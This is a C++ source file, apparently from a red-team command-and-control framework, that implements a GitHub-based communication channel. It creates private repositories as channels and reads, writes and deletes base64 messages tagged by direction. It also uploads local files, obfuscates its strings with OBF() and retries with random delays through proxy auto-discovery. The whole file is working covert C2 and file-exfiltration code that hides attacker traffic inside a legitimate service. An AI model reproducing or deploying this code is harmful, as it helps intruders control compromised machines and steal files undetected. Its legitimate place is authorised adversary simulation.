#include "stdafx.h"
#include "GithubApi.h"
#include "Common/FSecure/CppTools/StringConversions.h"
#include "Common/FSecure/WinHttp/HttpClient.h"
#include "Common/FSecure/Crypto/Base64.h"
#include <fstream>

using namespace FSecure::StringConversions;
using namespace FSecure::WinHttp;

namespace {
	std::wstring ToWideString(std::string const& str) {
		return Convert<Utf16>(str);
	}
}

FSecure::GithubApi::GithubApi(std::string const& token, std::string const& channelName, std::string const& userAgent) {
	if (auto winProxy = WinTools::GetProxyConfiguration(); !winProxy.empty())
		this->m_ProxyConfig = (winProxy == OBF(L"auto")) ? WebProxy(WebProxy::Mode::UseAutoDiscovery) : WebProxy(winProxy);


	std::string lowerChannelName = channelName;
	std::transform(lowerChannelName.begin(), lowerChannelName.end(), lowerChannelName.begin(), [](unsigned char c) { return std::tolower(c); });

	SetToken(token);
	SetUserAgent(userAgent);
	SetUser();
	SetChannel(CreateChannel(lowerChannelName));
}

void FSecure::GithubApi::SetUser() {
	std::string url = OBF("https://api.github.com/user");
	json response = SendJsonRequest(url, NULL, Method::GET);

	if (response.contains(OBF("login"))) {
		this->m_Username = response[OBF("login")];
	}
	else {
		throw std::runtime_error(OBF("Throwing exception: bad credentials\n"));
	}
}

void FSecure::GithubApi::SetUserAgent(std::string const& userAgent) {
	this->m_UserAgent = userAgent;
}

void FSecure::GithubApi::SetToken(std::string const& token) {
	this->m_Token = token;
}

void FSecure::GithubApi::SetChannel(std::string const& channelName) {
	this->m_Channel = channelName;
}

std::map<std::string, std::int64_t> FSecure::GithubApi::ListChannels() {
	std::map<std::string, std::int64_t> channelMap;
	std::string url = OBF("https://api.github.com/user/repos");

	json response = SendJsonRequest(url, NULL, Method::GET);
	
	for (auto& channel : response) {
		std::string channelName = channel[OBF("name")];

		std::int64_t cId = channel[OBF("id")];

		channelMap.insert({ channelName, cId });
	}
	return channelMap;
}

std::string FSecure::GithubApi::CreateChannel(std::string const& channelName) {
	std::map<std::string, std::int64_t> channels = this->ListChannels();
	std::string url;
	std::string	errorMsg;
	json response;

	if (channels.find(channelName) == channels.end())
	{
		url = OBF("https://api.github.com/user/repos");

		json j;
		j[OBF("name")] = channelName;
		j[OBF("auto_init")] = true;
		j[OBF("private")] = true;

		response = SendJsonRequest(url, j, Method::POST);

		if (response.contains(OBF("message"))) {
			errorMsg = response[OBF("message")] + OBF("\n");
			throw std::runtime_error(OBF("Throwing exception: unable to create channel - ") + errorMsg);
		}
	}
	return channelName;
}

FSecure::ByteVector FSecure::GithubApi::ReadFile(std::string const& filename) {
	std::string url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel 
						+ OBF("/contents/") + filename;

	ByteVector content = SendHttpRequest(url, OBF("application/vnd.github.v3.raw"), Method::GET, true);

	return content;
}

void FSecure::GithubApi::WriteMessageToFile(std::string const& direction, ByteView data, std::string const& providedFilename) {
	std::string filename;
	std::string url;
	json j;

	if (providedFilename.empty()) {
		///Create a filename thats prefixed with message direction and suffixed
		// with more granular timestamp for querying later
		std::string ts = std::to_string(FSecure::Utils::TimeSinceEpoch());
		filename = direction + OBF("-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts;
	}
	else {
		filename = providedFilename;
	}

	url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel +
		OBF("/contents/") + filename;

	j[OBF("message")] = OBF("Initial Commit");
	j[OBF("branch")] = OBF("master");
	j[OBF("content")] = cppcodec::base64_rfc4648::encode(data);

	json response = SendJsonRequest(url, j, Method::PUT);
}

void FSecure::GithubApi::UploadFile(std::string const& path) {
	std::filesystem::path filepathForUpload = path;
	auto readFile = std::ifstream(filepathForUpload, std::ios::binary);

	ByteVector packet = ByteVector{ std::istreambuf_iterator<char>{readFile}, {} };
	readFile.close();

	std::string ts = std::to_string(FSecure::Utils::TimeSinceEpoch());
	std::string fn = filepathForUpload.filename().string();  // retain same file name and file extension for convenience.
	std::string filename = OBF("upload-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts + OBF("-") + fn;

	WriteMessageToFile("", packet, filename);
}

void FSecure::GithubApi::DeleteFile(std::string const& filename) {
	json j;
	json response;

	std::string getFileInfoUrl = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel
		+ OBF("/contents/") + filename;

	response = json::parse(SendHttpRequest(getFileInfoUrl, OBF("*/*"), Method::GET, true));

	if (!response.contains(OBF("sha"))) {
		throw std::runtime_error(OBF("Throwing exception: file does not exist - "));
	}

	std::string delFileUrl = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel
		+ OBF("/contents/") + filename;

	j[OBF("message")] = OBF("Initial Commit");
	j[OBF("sha")] = response[OBF("sha")];

	response = SendJsonRequest(delFileUrl, j, Method::DEL);
}

void FSecure::GithubApi::DeleteAllFiles() {
	std::string url;
	std::string filename;
	json j;
	json response;

	std::string getAllFileInfoUrl = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + 
						this->m_Channel + OBF("/contents/");

	std::string baseUrl = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") + this->m_Channel
		+ OBF("/contents/");
	
	response = json::parse(SendHttpRequest(getAllFileInfoUrl, OBF("*/*"), Method::GET, true));

	if (response.contains(OBF("message"))) {
		throw std::runtime_error(OBF("Throwing exception: repository is empty\n"));
	}
		
	j[OBF("message")] = OBF("Initial Commit");

	for (auto& file : response) {
		j[OBF("sha")] = file[OBF("sha")];
		filename = file[OBF("name")];
		url = baseUrl + filename;

		SendJsonRequest(url , j, Method::DEL);
	}
}

std::map<std::string, std::string> FSecure::GithubApi::GetMessagesByDirection(std::string const& direction) {
	std::map<std::string, std::string> messages;
	json response;
	std::size_t found;
	
	std::string url = OBF("https://api.github.com/repos/") + this->m_Username + OBF("/") +
						this->m_Channel + OBF("/contents");

	response = json::parse(SendHttpRequest(url, OBF("*/*"), Method::GET, true));

	for (auto& match : response) {
		if (match.contains(OBF("name"))) {
			std::string filename = match[OBF("name")];

			//Search whether filename contains direction id
			found = filename.find(direction);

			if (found != std::string::npos) {
				std::string ts = filename.substr(filename.length() - 10); // 10 = epoch time length
				messages.insert({ ts, filename });
			}
		}
	}
	return messages;
}

FSecure::ByteVector FSecure::GithubApi::SendHttpRequest(std::string const& host, FSecure::WinHttp::ContentType contentType, std::vector<uint8_t> const& data, FSecure::WinHttp::Method method, bool setAuthorizationHeader) {
	return SendHttpRequest(host, GetContentType(contentType), data, method, setAuthorizationHeader);
}

FSecure::ByteVector FSecure::GithubApi::SendHttpRequest(std::string const& host, std::wstring const& contentType, std::vector<uint8_t> const& data, FSecure::WinHttp::Method method, bool setAuthorizationHeader) {
	while (true) {
		HttpClient webClient(ToWideString(host), m_ProxyConfig);
		HttpRequest request;
		request.m_Method = method;

		if (!data.empty()) {
			request.SetData(contentType, data);
		}

		request.SetHeader(Header::UserAgent, ToWideString(this->m_UserAgent));

		if (setAuthorizationHeader) { // Only set Authorization header when needed (S3 doesn't like this header)
			request.SetHeader(Header::Authorization, OBF(L"token ") + ToWideString(this->m_Token));
		}

		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created) {
			return resp.GetData();
		}
		else if (resp.GetStatusCode() == StatusCode::TooManyRequests) {
			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		}
		else {
			throw std::exception(OBF("[x] Non 200/201/429 HTTP Response\n"));
		}
	}
}

FSecure::ByteVector FSecure::GithubApi::SendHttpRequest(std::string const& host, std::string const& acceptType, FSecure::WinHttp::Method method, bool setAuthorizationHeader) {
	while (true) {
		HttpClient webClient(ToWideString(host), m_ProxyConfig);
		HttpRequest request;
		request.m_Method = method;

		request.SetHeader(Header::Accept, ToWideString(acceptType));

		request.SetHeader(Header::UserAgent, ToWideString(this->m_UserAgent));

		if (setAuthorizationHeader) { // Only set Authorization header when needed (S3 doesn't like this header)
			request.SetHeader(Header::Authorization, OBF(L"token ") + ToWideString(this->m_Token));
		}

		auto resp = webClient.Request(request);

		if (resp.GetStatusCode() == StatusCode::OK || resp.GetStatusCode() == StatusCode::Created) {
			return resp.GetData();
		}
		else if (resp.GetStatusCode() == StatusCode::TooManyRequests) {
			std::this_thread::sleep_for(Utils::GenerateRandomValue(10s, 20s));
		}
		else {
			throw std::exception(OBF("[x] Non 200/201/429 HTTP Response\n"));
		}
	}
}

json FSecure::GithubApi::SendJsonRequest(std::string const& url, json const& data, FSecure::WinHttp::Method method) {
	if (data == NULL) {
		return json::parse(SendHttpRequest(url, ContentType::MultipartFormData, {}, method));
	}
	else {
		std::string j = data.dump();
		return json::parse(SendHttpRequest(url, ContentType::ApplicationJson, { std::make_move_iterator(j.begin()), std::make_move_iterator(j.end()) }, method));
	}
}